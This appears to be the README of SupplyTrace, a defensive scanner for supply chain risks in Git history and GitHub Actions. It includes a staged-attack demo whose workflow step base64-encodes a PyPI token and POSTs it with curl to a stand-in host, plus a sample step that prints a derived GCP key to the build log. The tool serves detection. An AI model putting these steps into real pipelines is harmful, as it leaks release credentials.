# SupplyTrace

Find **software supply chain attacks** — in a repository's Git history, and in
its GitHub Actions CI/CD pipeline.

Two halves that feed each other:

| Phase | Command | Question it answers |
|---|---|---|
| **Git history** | `supplytrace investigate` | *Which commits should I read first?* |
| **CI/CD + attack DAG** | `cicd_detector scan` | *What can an attacker do to this pipeline, and how?* |

The second half is built on the first: it reuses the same Git analyzer, evidence
model, and hardened Git layer rather than re-implementing them.

---

# Quickstart — clone and run against GitHub Actions Goat

Five minutes, no API key, no network beyond the two `git clone`s.

### 1. Prerequisites

- **Python 3.11+** (`python --version`)
- **Git** on your `PATH` (`git --version`)

### 2. Get the tool and install it

**Linux / macOS**

```bash
git clone https://github.com/Kr4z31n/ci-cd-pipeline-scanner
cd ci-cd-pipeline-scanner

python -m venv .venv
source .venv/bin/activate

pip install -e ".[dev]"
```

**Windows (PowerShell)**

```powershell
git clone https://github.com/Kr4z31n/ci-cd-pipeline-scanner
cd ci-cd-pipeline-scanner

python -m venv .venv
.\.venv\Scripts\Activate.ps1

pip install -e ".[dev]"
```

`pip install -e .` pulls the three runtime dependencies automatically —
`pydantic`, `PyYAML`, `networkx`. Confirm it worked:

```bash
python -m cicd_detector --version
# cicd_detector 0.2.0
```

> **`No module named cicd_detector`?** You skipped `pip install -e .`, or you're
> in a different shell than the one where you activated the venv. See
> [Troubleshooting](#troubleshooting).

### 3. Get the target repository

[GitHub Actions Goat](https://github.com/step-security/github-actions-goat) is
StepSecurity's deliberately-vulnerable Actions repo. It's the primary test
target because its weaknesses are real and documented — including a workflow
reproducing the actual March 2025 `tj-actions/changed-files` incident.

```bash
cd ..
git clone https://github.com/step-security/github-actions-goat.git
cd ci-cd-pipeline-scanner
```

> Clone it **outside** the tool's directory so the scanner doesn't analyse
> itself. The Goat repo is only ever *read* — never executed, never modified.

### 4. Run the scan

```bash
python -m cicd_detector scan ../github-actions-goat --no-llm
```

That's it. `--no-llm` keeps it fully offline. You should see 24 workflows
parsed, 229 findings, and an attack graph.

### 5. Try the other commands

```bash
# Every finding in full: evidence, remediation, references
python -m cicd_detector analyze ../github-actions-goat

# Just one rule
python -m cicd_detector analyze ../github-actions-goat --rule SCRIPT_INJECTION

# Export the attack DAG
python -m cicd_detector graph ../github-actions-goat --output-dir ./graph-out

# Machine-readable, for CI gating
python -m cicd_detector scan ../github-actions-goat --no-llm \
    --format json --output report.json

# What does it look for, and why?
python -m cicd_detector rules
python -m cicd_detector rules --explain SECRET_EXPOSURE

# Run the tests
pytest -q -k cicd
```

### 6. Verify it against the source

Every finding cites a file and line. Check one yourself:

```bash
sed -n '29,33p' ../github-actions-goat/.github/workflows/tj-actions-changed-files-incident.yaml
```

---

# What you'll see, and what it means

Reading the output top to bottom.

## SCOPE — what was and wasn't examined

```
SCOPE
-----
  repository        : ../github-actions-goat
  workflows parsed  : 24 of 24
  git history       : 456 commits, 152 touching workflows
```

If any workflow fails to parse it is listed here **and** becomes a finding.
"We couldn't read this file" is a different answer from "this file is clean",
and the tool never lets the two look the same.

## FINDINGS — what the rules found

```
FINDINGS (229)
--------------
  CRITICAL=5  HIGH=48  MEDIUM=12  LOW=163  INFO=1

  CRITICAL F001  ACTION_UNPINNED    .github/workflows/hosted-file-monitor-with-hr.yml:20
           Unpinned action madhead/semver-utils@latest
           | - uses: madhead/semver-utils@latest
           confidence 0.95 (inferred)
```

| Field | Meaning |
|---|---|
| `CRITICAL` | **Severity** — how much damage if reachable |
| `F001` | Stable ID. Same repo ⇒ same ID, so you can cite it |
| `ACTION_UNPINNED` | Which rule fired |
| `…yml:20` | Open this line to check it |
| `\| - uses: …` | The **verbatim source line**, not a paraphrase |
| `confidence 0.95` | How sure the *detection* is — not how bad it is |
| `(inferred)` | `observed` = read from the file · `inferred` = a judgement |

Severity and confidence are deliberately separate. An unpinned action is
detected with near-certainty (0.95) — checking whether a string is a 40-char SHA
isn't a judgement call — but whether it's CRITICAL or LOW depends on what that
action can reach.

## ATTACK GRAPH — the DAG summary

```
ATTACK GRAPH
------------
  nodes             : 516
  edges             : 3163
  node types        : action=73, author=8, commit=125, external_host=3, ...
```

## ATTACK PATHS — how findings chain together

```
  AP002  HIGH  POTENTIAL_ATTACK_PATH  confidence 0.77
  A mutable third-party action reaches a token that can write the repository

  1. action 'build-helpers/version-utils@v2' executes on step 'Derive version metadata'
  2. step 'Derive version metadata' executes on runner 'ubuntu-latest (build)'
  3. runner 'ubuntu-latest (build)' has access to github_token 'GITHUB_TOKEN'
  4. github_token 'GITHUB_TOKEN' grants permission 'contents: write'
  5. permission 'contents: write' enables writing to repository 'this repository'

  evidence  : F005
  unknown   :
              - whether the referenced tag currently points at the reviewed revision
```

**`POTENTIAL_ATTACK_PATH` is the strongest verdict that exists.** There is no
"confirmed attack" value. A static read of a repository can show that a
configuration *permits* an attack; it cannot show that anyone took it. The
`unknown` block lists what would settle it.

## Exit codes

| Code | Meaning |
|---|---|
| `0` | Ran successfully |
| `1` | Error (bad path, unreadable repo) |
| `3` | `--fail-on` threshold met — for CI gating |

```bash
# Fail a build on anything CRITICAL
python -m cicd_detector scan . --no-llm --fail-on CRITICAL
```

---

# Enabling the LLM layer (optional)

**Everything above needs no API key and no network.** All findings and attack
paths come from the deterministic engine. Two different things get called
"correlation", and it matters which is which:

| | Who does it | Needs a key? |
|---|---|---|
| **Graph path correlation** | A plain algorithm (networkx searching the DAG) | ❌ No |
| **LLM correlation** | Gemini, actually reasoning | ✅ **Yes** |

Gemini performs **no detection**. It receives findings the rules already
produced — with IDs and verbatim snippets — plus the attack paths and Git
history, and writes a correlation over them.

### Get a key

1. Go to **[aistudio.google.com/apikey](https://aistudio.google.com/apikey)**
2. Sign in with a Google account → **Create API key**
3. Copy it. The free tier is enough for this; a scan sends roughly 20–30 KB.

### Set it

**Linux / macOS**
```bash
export GEMINI_API_KEY="your-key-here"
```

**Windows (PowerShell)** — current session:
```powershell
$env:GEMINI_API_KEY = "your-key-here"
```

**Windows** — permanently:
```powershell
setx GEMINI_API_KEY "your-key-here"   # then open a NEW terminal
```

`GOOGLE_API_KEY` also works. The key is read from the environment only — never
from a file, never logged, never written into a report.

### Install the SDK and run

```bash
pip install -e ".[dev,llm]"        # adds google-genai

python -m cicd_detector scan ../github-actions-goat        # note: NO --no-llm
```

Pick a different model with `--model gemini-2.5-pro` (default:
`gemini-2.5-flash`).

### Without a key it's skipped, never faked

```
LLM CORRELATION
---------------
  skipped: no LLM provider configured (set GEMINI_API_KEY to enable correlation)
```

### Three guardrails on the model

1. **It can only cite what it was given.** The prompt carries an explicit set of
   allowed finding IDs. Citations to anything else are stripped and the
   invention recorded. A "chain" left with no valid evidence is downgraded to
   `INSUFFICIENT_EVIDENCE`.
2. **It cannot claim an attack happened.** The verdict vocabulary has no such
   value.
3. **Its failure costs nothing.** No key, no network, malformed JSON, invented
   IDs — each returns a reason and the deterministic report prints unchanged.

Output lands in its own section, labelled interpretation rather than evidence.

---

# Architecture

```
                    ┌──────────────────────────────────────────┐
 .github/workflows  │  parser/                                 │
        │           │    yamlsrc.py     YAML + line numbers    │
        └──────────►│    workflow.py    jobs, steps, actions   │
                    │    expressions.py trust classification   │
                    │    shell.py       run: behaviours        │
                    │    taint.py       secret value flow      │
                    └───────────────────┬──────────────────────┘
                                        ▼
 git history  ────►  rules/  (11 rules)  ────►  Finding  ────┐
   (reuses            each cites file:line + verbatim snippet │
  GitAnalyzer)                                               │
                                                             ▼
                    ┌────────────────────────────────────────────┐
                    │  graph/                                    │
                    │    builder.py      nodes + edges + evidence│
                    │    correlation.py  search for attack paths │
                    │    export.py       json / graphml / dot    │
                    └───────────────────┬────────────────────────┘
                                        ▼
                     reporting/  text · json · markdown
                                        ▲
                     llm/  (optional) ──┘  Gemini correlates
```

## Module responsibilities

| Module | Job |
|---|---|
| `parser/yamlsrc.py` | YAML loader that keeps every value's **line number** |
| `parser/workflow.py` | Typed model: workflows → jobs → steps → actions |
| `parser/expressions.py` | Classifies `${{ }}` as untrusted / influenced / trusted |
| `parser/shell.py` | Recognises download, execute, exfiltrate, publish in `run:` |
| `parser/taint.py` | Follows a secret's **value** to a sink |
| `rules/*.py` | One module per rule; each yields evidenced `Finding`s |
| `rules/history.py` | Joins Git commits to workflow changes |
| `evidence/models.py` | The `Finding` contract |
| `evidence/collector.py` | Runs rules, assigns IDs, **drops unevidenced findings** |
| `graph/builder.py` | Builds the DAG; **refuses unevidenced edges** |
| `graph/correlation.py` | Searches for attack patterns by node *role* |
| `llm/*` | Prompt construction, response validation, grounding checks |

## Two key design decisions

**1. The graph has two layers over one set of nodes.**

- *Structural* edges from the files themselves (workflow **contains** job, step
  **invokes** action) — always true, always observed.
- *Security* edges from findings (input **interpolated_into** command, secret
  **sends_to** host) — exist **only where a rule produced evidence**.

An entry point is only reachable through structure, and only dangerous through a
security edge. `add_edge` refuses a security edge with no evidence and records
the refusal, so the path search can never build a route nobody can check.

**2. Paths are searched on roles, not fixed node sequences.**

```
ENTRY_POINT → EXECUTION → PRIVILEGE → ASSET → IMPACT
```

Hard-coding literal sequences would break the moment a workflow expressed the
same idea differently. Roles let a new node type join the search by declaring
where it sits. The DOT export groups by role, so a rendered graph reads
left-to-right in attack order.

---

# The eleven rules

```
$ python -m cicd_detector rules

  ACTION_UNPINNED            Third-party action is not pinned to a commit SHA
  EXCESSIVE_PERMISSIONS      Job holds write permissions on the GITHUB_TOKEN
  DANGEROUS_TRIGGER          Privileged trigger combined with untrusted code or input
  SCRIPT_INJECTION           Attacker-controlled expression interpolated into a command
  SECRET_EXPOSURE            A secret's value reaches a sink that can leak it
  REMOTE_CODE_FETCH          Remote content is downloaded and executed
  UNTRUSTED_CODE_EXECUTION   Fork-controlled code executes with base-repository privileges
  ARTIFACT_TAMPERING         An artifact can be modified between creation and use
  RELEASE_RISK               A publishing job is exposed to an upstream weakness
  THIRD_PARTY_ACTION         Inventory of external actions and their reach
  WORKFLOW_HISTORY_CHANGE    A commit changed a workflow's security posture
```

Every rule is **graded, not binary**. `ACTION_UNPINNED` alone spans four
severities depending on what the reference can reach:

| Reference | Severity | Why |
|---|---|---|
| `evil/action@main` + write perms | CRITICAL | branch ref moves on every push, reaches privileges |
| `vendor/tool@v1.2.3` + secrets | HIGH | mutable tag, reaches credentials |
| `vendor/tool@v1`, nothing in job | MEDIUM | mutable, but reaches little |
| `actions/checkout@v4` | LOW | mutable, but published by the platform you already trust |
| `actions/checkout@8f4b7f8…` | *not reported* | 40-hex SHA — immutable |

---

# Proof: what it finds on Goat

## It finds the real tj-actions bug

Goat ships `tj-actions-changed-files-incident.yaml`, reproducing CVE-2025-30066
/ GHSL-2023-271. Both halves are located:

```
HIGH     F052  SCRIPT_INJECTION   tj-actions-changed-files-incident.yaml:33
         steps.changed-files.outputs.all_changed_files interpolated into a run command
         | for file in ${{ steps.changed-files.outputs.all_changed_files }}; do

MEDIUM   F060  ACTION_UNPINNED    tj-actions-changed-files-incident.yaml:29
         Unpinned action tj-actions/changed-files@v35
         | uses: tj-actions/changed-files@v35
```

Lines 33 and 29 — open the file and check.

## It grades rather than shouts

Three Goat workflows use `pull_request_target`. The detector separates them:

| Workflow / job | Verdict | Why |
|---|---|---|
| `toc-tou.yml` · `vulnerable-pattern` | **CRITICAL** | `gh pr checkout` of PR code, then runs commands |
| `PRTargetWorkflow.yml` · `pr-target-check` | **LOW** | bare `actions/checkout` gets the *base* branch, not the fork's code |

A scanner that flags every `pull_request_target` equally would call these the
same thing. Both statements are true of the same trigger.

## It stays quiet on decoys

`secret-in-build-log.yml` has two `echo`s in a step holding a GCP key. Only one
leaks:

```yaml
PRIVATE_KEY=$(echo $GCP_SERVICE_ACCOUNT_KEY | jq -r '.private_key')
echo "Using the private key for some operation"     # ← decoy, NOT reported
echo "GCP Private Key: $PRIVATE_KEY"                # ← reported, line 29
```

This is taint tracking, not grep: the value is followed
`secrets.GCP_SERVICE_ACCOUNT_KEY` → `$GCP_SERVICE_ACCOUNT_KEY` → `$PRIVATE_KEY`
→ sink. It's marked `derived: true`, which matters — GitHub masks the *exact*
secret string in logs, and a value that has been through `jq` no longer matches
the mask, so it prints in the clear.

---

# The staged-attack demo

Goat demonstrates vulnerable *workflows*. It does not demonstrate a vulnerable
*history* — its commits are ordinary work. So the repo ships a generator for the
missing half:

```bash
python examples/build_cicd_demo.py ./demo
python -m cicd_detector scan ./demo --no-llm
```

A pipeline that starts hardened, then walks through the change sequence a real
compromise looks like. **No single commit is obviously malicious** — that's the
point:

| Commit | Change | How it reads in review |
|---|---|---|
| **C1** | adds `build-helpers/version-utils@v2` | "stop hand-maintaining the version string" |
| **C2** | `contents/packages/id-token: write` | "the release job needs to push the package" |
| **C3** | adds a build-telemetry step | "track release durations" |

C3 is the payload:

```yaml
- name: Report build telemetry
  env:
    RELEASE_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
  run: |
    BUILD_ID=$(echo "$RELEASE_TOKEN" | base64 -w0)
    curl -sS -X POST -d "build=$BUILD_ID" https://build-telemetry.example.net/ingest
```

Caught, even though the token is never named on the `curl` line — it arrives as
`$BUILD_ID`, two assignments away:

```
F004  CRITICAL  SECRET_EXPOSURE  confidence=0.85  INFERRED
  PYPI_API_TOKEN is sent to a remote host in job 'build'
  location   : .github/workflows/release.yml:30
  job/step   : build / Report build telemetry

  Step 'Report build telemetry' in job 'build' references $BUILD_ID, which was
  derived from PYPI_API_TOKEN on a line whose value is passed to a command that
  sends data to a remote host. This is an opportunity for the secret to escape,
  not evidence that it did. The step also contacts
  https://build-telemetry.example.net/ingest, which is not a common CI host.

  evidence:
    release.yml:30  curl -sS -X POST -d "build=$BUILD_ID" https://build-telemetry.example.net/ingest
    release.yml:28  run: |

  remediation:
    Keep secrets in env: and never echo, cat or redirect them. If a secret must
    be transformed, emit '::add-mask::' for the derived value so the log masks
    that too.
```

---

# The attack DAG

```bash
python -m cicd_detector graph ./demo --output-dir ./graph
```

```
attack graph: 48 nodes, 104 edges
attack paths: 4
  json      ./graph/attack_graph.json
  dot       ./graph/attack_graph.dot
  graphml   ./graph/attack_graph.graphml
```

| File | Use it with |
|---|---|
| `attack_graph.json` | Anything — full nodes, edges, paths, evidence IDs |
| `attack_graph.graphml` | Gephi, yEd, Cytoscape |
| `attack_graph.dot` | Graphviz |

Render a picture (needs [Graphviz](https://graphviz.org/download/)):

```bash
dot -Tsvg ./graph/attack_graph.dot -o attack_graph.svg
```

Nodes are grouped into `ENTRY_POINT → EXECUTION → PRIVILEGE → ASSET → IMPACT`
columns, coloured by role, with attack-path edges highlighted in red.

## Three graph bugs worth knowing about

The graph was built, then run against real data — and the first version
confidently produced **attack paths that did not exist**. All three are fixed,
each with a regression test in `tests/test_cicd_graph.py`:

1. **Shared runner node.** Keyed on `runs-on`, so all 26 Goat jobs shared one
   `ubuntu-latest` node — joining every unrelated workflow through it.
2. **Shared action node.** `actions/checkout` was one node, so a path could
   enter `toc-tou.yml` and *exit through a different workflow's runner*.
3. **Severity inflation.** Paths scored on every finding attached to any node
   along the route, so one unrelated CRITICAL promoted everything to CRITICAL.

The lesson generalises: in a graph used for reachability, any node shared
between contexts is a false-transitivity bug waiting to happen.

---

# Tests

```bash
pytest -q -k cicd      # the CI/CD detector: 135 tests
pytest -q              # everything: 342 pass
```

- one test per rule asserting **rule ID, severity, and file:line** — a rule that
  fires at the wrong location is not a working rule;
- negative cases for every rule, because a detector that can't stay quiet gets
  switched off;
- the three graph-soundness regressions above;
- `test_untrusted_input_to_secret_path`, the chain the spec names;
- LLM tests using a fake provider — **no test needs a key or a network**.

> **11 pre-existing failures on Windows.** Rohit's original suite deliberately
> creates filenames containing newlines, tabs and non-UTF-8 bytes, which NTFS
> forbids. They fail identically on the unmodified commit (verified by
> stashing), and pass on Linux. Nothing to do with the CI/CD detector.

---

# Troubleshooting

**`No module named cicd_detector`**
You skipped the install, or you're in a shell where the venv isn't active.

```bash
pip install -e ".[dev]"
```

Some Python setups (isolated mode, `-I`, or `PYTHONSAFEPATH=1`) ignore the
current directory entirely, so installing is the reliable fix rather than
relying on `PYTHONPATH`.

**`git history unavailable` / `not a git repository`**
Harmless — the workflow rules don't need history. The scan continues. Use
`--no-history` to skip it deliberately, which is also much faster.

**`No module named venv`**
Your Python is a stripped/embeddable build. Install the full python.org
distribution, or `apt install python3-venv`.

**Scan is slow on a large repo**
History analysis dominates. Bound it:

```bash
python -m cicd_detector scan ./repo --max-commits 200
python -m cicd_detector scan ./repo --no-history      # fastest
```

**`dot: command not found`**
Graphviz isn't installed. The `.json` and `.graphml` exports still work.

**Too much output**
```bash
python -m cicd_detector scan ./repo --no-llm --min-severity HIGH --top 10
```

**`google.genai` import error**
```bash
pip install -e ".[dev,llm]"
```

---

# Gaps and limitations

Stated plainly, because a security tool that oversells is worse than none.

### What it cannot know from files alone

- **Effective token permissions.** With no `permissions:` block, the scopes come
  from repository/org settings that aren't in the repo. The tool says it can't
  tell rather than guessing.
- **Whether a workflow ever ran** on an outsider-supplied event. That's in the
  Actions run log. Every attack path lists this under `unknown`.
- **Where a tag points now.** `@v35` is flagged as mutable, but the action isn't
  fetched to resolve it. That needs network access.

### What the analysis doesn't reach

- **Taint tracking is shallow** — it follows assignment and command substitution
  within one `run:` block. Not control flow, arrays, or values crossing between
  steps.
- **Composite and reusable workflows** are recorded but not followed into.
- **The action's own code is never fetched or analysed** — only its reference.
- **Non-GitHub CI** (GitLab, Jenkins, CircleCI) isn't parsed. The file
  classifier recognises them; the rule engine doesn't read them.
- **`if:` conditions aren't evaluated**, so a step gated behind a condition that
  can never be true is still analysed.

### What it will never say

**Reachable ≠ exploited.** The tool shows that a configuration *permits* an
attack. It cannot show anyone took it, so `POTENTIAL_ATTACK_PATH` is the
ceiling — by design, not by omission.

---

# Design principles

1. **Deterministic detection first.** The LLM is an analyst, never the scanner.
2. **Every conclusion traces to evidence.** A finding with no citation is
   dropped by the collector; an unevidenced graph edge is refused.
3. **Three things stay separate**: `OBSERVED` fact, `INFERRED` judgement, LLM
   hypothesis. Each is labelled in the output.
4. **Never claim an attack occurred.**
5. **Say when you couldn't look.** An unparseable workflow becomes a finding.
6. **Grade, don't shout.** Severity depends on reachability.
7. **Read, never execute.** A repository's own Git config can make Git run
   programs; the hardened runner refuses. Nothing from a scanned repo is run.

---

# Part 1 — Git history analysis (the original tool)

Git treats every file as plain text. It has no idea that
`.github/workflows/build.yml` controls how software is built while `README.md`
controls nothing. So SupplyTrace labels every changed file by **role**:

| File | Role |
|---|---|
| `src/app.py` | SOURCE |
| `.github/workflows/build.yml` | WORKFLOW — *how it's built* |
| `package.json` | DEPENDENCY_MANIFEST — *what it says it needs* |
| `package-lock.json` | LOCKFILE — *what it actually installs* |

Then it looks for odd combinations: a commit changing a workflow **and** a
dependency file; a lockfile changing **without** its manifest (the installed
packages changed, but nobody asked for a new package).

```bash
supplytrace analyze     ./repo          # history, authors, file changes
supplytrace investigate ./repo          # commits ranked by review priority
supplytrace commit      ./repo <sha>
```

Signals are **observed**; the ranking is **inferred** — a reading order, not an
accusation.

`cicd_detector` is a thin entry point over `supplytrace.cicd`, so the detector
shares this codebase while being reachable under the name the spec uses. The two
CLIs stay separate: `supplytrace` keeps its original three commands untouched.

---

# Layout

```
ci-cd-pipeline-scanner
  analyzers/          Git history analysis
  models/             commits, files, evidence, signals
  core/               hardened git runner, config, errors
  cicd/               ── the CI/CD attack detector ──
    parser/           workflow · yamlsrc · expressions · shell · taint
    rules/            one module per rule + base.py, history.py
    evidence/         models.py (Finding), collector.py
    graph/            models · builder · correlation · export
    llm/              base · gemini · prompts · schemas
    reporting/        text.py, json_report.py
    cli.py
cicd_detector/        entry point for `python -m cicd_detector`
examples/             build_demo.py, build_cicd_demo.py
tests/
```
